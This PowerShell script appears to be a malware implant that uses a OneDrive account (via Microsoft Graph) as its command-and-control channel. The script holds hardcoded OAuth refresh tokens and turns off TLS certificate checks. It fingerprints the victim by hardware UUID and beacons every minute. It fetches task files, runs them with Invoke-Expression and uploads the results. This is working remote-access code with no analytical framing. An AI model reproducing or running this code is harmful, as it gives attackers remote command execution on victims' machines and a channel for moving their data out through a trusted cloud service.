Set-StrictMode -Version 2.0
$counter = 0;
$Authorize = $false;
$AppDir='AmazonStore';
$ClinetDir='clients';
$ClinetTaskDir='tasks';
$ClinetResultDir='results';
$ClientToken = $null;
$od_oauth = "https://login.live.com/oauth20_token.srf";
$od_api_endpoint='https://graph.microsoft.com/v1.0/drive/root:/';
$redirect_uri="https://login.live.com/oauth20_desktop.srf";
#$od_refresh="M.R3_BL2.-CcVxTObLIc13F0e5O5AiMgjaZQd8LJg41YY2WyQVS0uYd0uVacIUFKvv4EMHq5QsYUXZMq0YPZkwK05NFhdF2wnkUPH0Qe8lWQrjer!6regah1BoUAfjr!wwuznOGWkyedf6HyV!L*tbcnwAa2GIad4EAkzvpGAmop0A!6UImVyp7dr1WboG9H9M*UN3jFgqnJ2FOM*F9e4YNWbsHzcgpZRtlY8N*4WtkXku1bgEdKHhguoHYMT7F4oAj!HWFmpbv9E65B8q9o9KFk6rg49jJz5i2epyFCtxHka0imX5WOPBtGxxTfds9GhL5lPhidkyPEfRs
nzJ59v1vLNMjzLMQ4vYCXt14*wMn8wN!GgXYfBi";
$od_refresh="M.R3_BL2.-CX1EvzhgB*q*vSIoMqM6vR52jBJ0LXZSqQx672FrkpuB0p8k3eN0jzxn6lcn8BJbI!gByPG3YCTgASJl2tUkw*5Z*Qw6HRCnauQliOmX2smd1JPYGSC4PMZ19TU89b7gV!qo73IYx7twHcBS4H71nMkYtvEwbhTKEWjvZDywHipXauuBtjsqP7NyOhCl3beQGt9ysAjgYaxj1GDC9zkSZM!OqGVvZYIrAEP*T1vDZD6ay*QjU9OvKgFzDocQd5QZ*w3U6NIy18l9zIYlRyamhd1abGI*qZ3DoUE7JXB*kymAUJuJHM0VaBztFnWxbt*Z2gZSld
gwiKJs4vAhiHDjfvRRhIXvPXUjfFQtJqBc6Umw";
$od_clientId="974fd7bb-a171-44ab-a84f-a0f61ff63406";
$MtxName='WinEventCom';
$MtxHandle=$null;
$refresh_file_path = ".\bin.dat";

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$false}

#Test mutex part

Try {
	[Threading.Mutex]$OpenExistingMutex = [Threading.Mutex]::OpenExisting($MtxName)
	exit;
} Catch [Threading.WaitHandleCannotBeOpenedException] {
	# The named mutex does not exist
	$MtxHandle=New-Object System.Threading.Mutex($true, $MtxName)
}
####


$TargetId=(get-wmiobject Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID).trim();
$ProcessId = Get-Process -ID $PID | select -expand id;


Add-Type -TypeDefinition @"
   public enum RestMethod
   {
      GET,
      PUT,
      POST,
      DELETE
   }
"@

Function ConvertTo-Json20 {
        [CmdletBinding()]
        Param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True,ValueFromPipelinebyPropertyName=$True)]
        [object]$item
        )
PROCESS {
            add-type -assembly system.web.extensions
            $ps_js=new-object system.web.script.serialization.javascriptSerializer
            return $ps_js.Serialize($item)
        }
}

Function ConvertFrom-Json20 {
        [CmdletBinding()]
        Param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True,ValueFromPipelinebyPropertyName=$True)]
        [object]$item
        )
PROCESS {
        add-type -assembly system.web.extensions
        $ps_js=new-object system.web.script.serialization.javascriptSerializer 
        return $ps_js.DeserializeObject($item) 
    }
}

Function irm20
{
    param
    (
        [Parameter(Mandatory=$true)]
        [RestMethod]
        $Method,
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [System.String]
        $Uri,
        [Parameter(Mandatory=$false)]
        [object]
        $Body,
        [Parameter(Mandatory=$false)]
        [System.string]
        $User,
        [Parameter(Mandatory=$false)]
        [System.String]
        $Password,
        [Parameter(Mandatory=$false)]
        [System.String]
        $UserAgent,
        [Parameter(Mandatory=$false)]
        [switch]
        $asJson,
        [System.String]
        $ContentType = 'application/json',
        [Parameter(Mandatory=$false)]
        [object]
        $Headers
    )
    $webclient = New-Object System.Net.WebClient;

    if ($Headers -ne $null)
    {
        $Headers.Keys | % { $webclient.Headers.add($_, $Headers.Item($_)) } 
    }

    Try 
    {
        if ($Method -eq "GET")
        {
            $response = $webClient.DownloadString($Uri);
            Set-Variable -Name "Authorize" -value $true -scope global
            
        }
        elseif ($Method -eq "PUT" -or $Method -eq "POST" -or $Method -eq "DELETE")
        {
            $response = $webClient.UploadString($Uri,$Method,$Body);
            Set-Variable -Name "Authorize" -value $true -scope global
        }
    }

    Catch [System.Net.WebException]
    {
      
        $exeption= $_.Exception.ToString().trim();
        $response = $null;
				
        if ($exeption.Contains("Bad Request"))
        {
            Set-Variable -Name "Authorize" -value $false -scope global
        }
        elseif ($exeption.Contains("SSL/TLS"))
        {
            Set-Variable -Name "Authorize" -value $true -scope global
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
            
        }
        else
        {
            Set-Variable -Name "Authorize" -value $true -scope global
        }
    }
	
    return $response;
   
}



$OneDriveOauth={
    param($api, $refresh, $client_id)
	
    $dbx_headers = @{};
    $access_token = $null;
	$refresh_token = $null;
	$postdata = "client_id=$client_id&redirect_uri=$redirect_uri&refresh_token=$refresh&grant_type=refresh_token";
	$dbx_headers.Add('Content-Type', 'application/x-www-form-urlencoded');
    $Response = irm20 -Uri $api -Method Post -Body $postdata -Headers $dbx_headers;

    if (-Not [string]::IsNullOrEmpty($Response))
    {
		
		Try
		{
			$access_token = ($Response | ConvertFrom-Json20)['access_token'];
		}
		Catch{}
		Try
		{
			$refresh_token = ($Response | ConvertFrom-Json20)['refresh_token'];
			Set-Variable -Name "od_refresh" -value $null -scope global;
			Set-Variable -Name "od_refresh" -value $refresh_token -scope global;	
		}
		Catch{}
    }

    return $access_token;
}

$OneDriveUp={
	
	param($api, $token, $path, $body);
    $dbx_headers = @{};
    $dbx_headers.Add('Authorization', "Bearer $token");
    $dbx_headers.Add('Content-Type', 'application/octet-stream');
 
    irm20 -Uri $api$path":/content" -Method Put -Body $body -Headers $dbx_headers | Out-Null
   
    
}

$OneDriveList={
	
	param($api, $token, $path);
    $dbx_headers = @{};
    $dbx_headers.Add('Authorization', "Bearer $token");
    irm20 -Uri $api$path":/children" -Method Get -Headers $dbx_headers 
}

$OneDriveDownload={
	
	param($api, $token, $path);
    $dbx_headers = @{};
    $dbx_headers.Add('Authorization', "Bearer $token");
    irm20 -Uri $api$("$path".Substring("$path".IndexOf("/AmazonStore")))":/content" -Method Get -Headers $dbx_headers;
}

$OneDriveDelete={
	
	param($api, $token, $path);
    $dbx_headers = @{};
    $dbx_headers.Add('Authorization', "Bearer $token");
    irm20 -Uri $api$("$path".Substring("$path".IndexOf("/AmazonStore"))) -Method DELETE -Headers $dbx_headers
}


$HandleOneDriveRequest={
				
	while($true)
	{
        $Token = Invoke-Command $OneDriveOauth -ArgumentList $od_oauth, $od_refresh, $od_clientId;
        if (-Not $Authorize)
        {
            exit;
        }

        if ([string]::IsNullOrEmpty($Token))
        {
            Start-Sleep -Second 30;
            continue;
        }
        else
        {
			Set-Variable -Name "ClientToken" -value $null -scope global;
            Set-Variable -Name "ClientToken" -value $Token -scope global;
            break;
        }

    }
}

#Write-Output $od_refresh;
Start-Sleep -Second 15;
Invoke-Command $HandleOneDriveRequest
#Write-Output $od_refresh;
#exit;

while($true)
{
		
        Start-Sleep -Second 60;
		$counter+=1;
		
		if ($counter % 45 -eq 0)
		{
			Invoke-Command $HandleOneDriveRequest;
		}
     
        $ActualList=@{};
        $DirtyList=@{};
        $ActualListCounter=0;
        
      
		Invoke-Command $OneDriveUp -ArgumentList $od_api_endpoint, $ClientToken, $AppDir/$ClinetDir/$TargetId , "$ProcessId.$counter";
       
        $FileListCustomObject = Invoke-Command $OneDriveList -ArgumentList $od_api_endpoint, $ClientToken, "$AppDir/$ClinetTaskDir";
		
        if ($FileListCustomObject -eq $null)
        {
            continue;
        }
        
    
        foreach ($item in ($FileListCustomObject | ConvertFrom-Json20)['value'])
        {
			
            if ($item['name'] -match $TargetId)
            {
                $ActualList[$ActualListCounter]=$item['parentReference']['path']+'/'+$item['name'];
                $ActualListCounter++;
            }
        }

	  
        for($i=0; $i -lt $ActualList.Count ; $i++)
        {

            $payload = Invoke-Command $OneDriveDownload -ArgumentList $od_api_endpoint, $ClientToken, $ActualList[$i]
          
			Invoke-Command $OneDriveDelete -ArgumentList $od_api_endpoint, $ClientToken, $ActualList[$i] | Out-Null;	
            $payload_result=$null;
            Try{
                Invoke-Expression -Command $payload | Out-String -OutVariable payload_result | Out-Null;
            }
            Catch{
                $payload_result=$_.Exception
            }
            
            if ($payload_result -ne $null)
            {
                $time=(Get-Date (Get-Date).ToUniversalTime() -UFormat %s).Replace(',','').Replace('.','');
                Invoke-Command $OneDriveUp -ArgumentList $od_api_endpoint, $ClientToken, $AppDir/$ClinetResultDir/$TargetId.$time , $payload_result;
            }       
	   }  
}